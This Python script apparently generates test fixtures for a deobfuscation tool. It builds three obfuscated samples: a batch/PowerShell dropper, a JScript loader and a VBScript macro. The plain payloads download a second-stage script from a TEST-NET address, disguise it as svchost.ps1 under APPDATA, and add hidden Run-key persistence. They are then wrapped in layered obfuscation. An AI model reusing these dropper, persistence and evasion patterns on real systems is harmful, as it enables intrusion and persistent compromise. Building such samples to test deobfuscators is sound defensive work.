"""Write a few realistic, harmless obfuscated samples to examples/samples/ (or the folder given).

They are generated rather than committed: files shaped like droppers tend to upset antivirus engines,
even when, as here, the hidden payloads only point at TEST-NET addresses and example.* domains and
nothing in them is ever meant to run. Same seed, same samples.

    python examples/make_samples.py
    unwrap examples/samples/dropper.bat
"""

import random
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "tests"))
import obfuscator as ob  # noqa: E402

DL = "Download" + "File"


def dropper(rng):
    """cmd launcher -> -EncodedCommand -> Invoke-Obfuscation IEX -> XOR -> deflate -> chars -> format string."""
    payload = ("$u = 'http://203.0.113.50/update/stage2.ps1'\r\n"
               "$d = \"$env:APPDATA\\Microsoft\\svchost.ps1\"\r\n"
               f"(New-Object Net.WebClient).{DL}($u, $d)\r\n"
               "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name Updater "
               "-Value \"powershell -w hidden -f $d\"")
    code = payload
    for technique in (ob.ps_format, ob.ps_chars, ob.ps_gzip, ob.ps_xor, ob.ps_concat):
        code = technique(rng, code)
    return ob.batch_launcher(rng, code)


def loader(rng):
    """A JScript loader: packer -> fromCharCode -> atob -> reversed string."""
    payload = ("var x = new ActiveXObject('MSXML2.XMLHTTP');\n"
               "x.open('GET', 'https://cdn.example.net/assets/app.js', false); x.send();\n"
               "new ActiveXObject('WScript.Shell').Run('cmd /c echo ' + x.status, 0, false);")
    code = payload
    for technique in (ob.js_reverse, ob.js_atob, ob.js_charcode, ob.js_packer):
        code = technique(rng, code)
    return code


def macro(rng):
    """VBScript: Chr() soup -> Replace() junk -> StrReverse -> concatenation."""
    payload = ('Set sh = CreateObject("WScript.Shell")\r\n'
               'sh.Run "powershell -nop -w hidden -c Get-Date", 0\r\n'
               'sh.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd", "wscript.exe"')
    code = payload
    for technique in (ob.vbs_concat, ob.vbs_reverse, ob.vbs_replace, ob.vbs_chr):
        code = technique(rng, code)
    return code


SAMPLES = {"dropper.bat": dropper, "loader.js": loader, "macro.vbs": macro}


def main(out: Path) -> None:
    out.mkdir(parents=True, exist_ok=True)
    for name, make in SAMPLES.items():
        text = make(random.Random(2026))
        (out / name).write_text(text, encoding="utf-8", newline="")
        print(f"{out / name}  ({len(text):,} chars)")


if __name__ == "__main__":
    main(Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).resolve().parent / "samples")
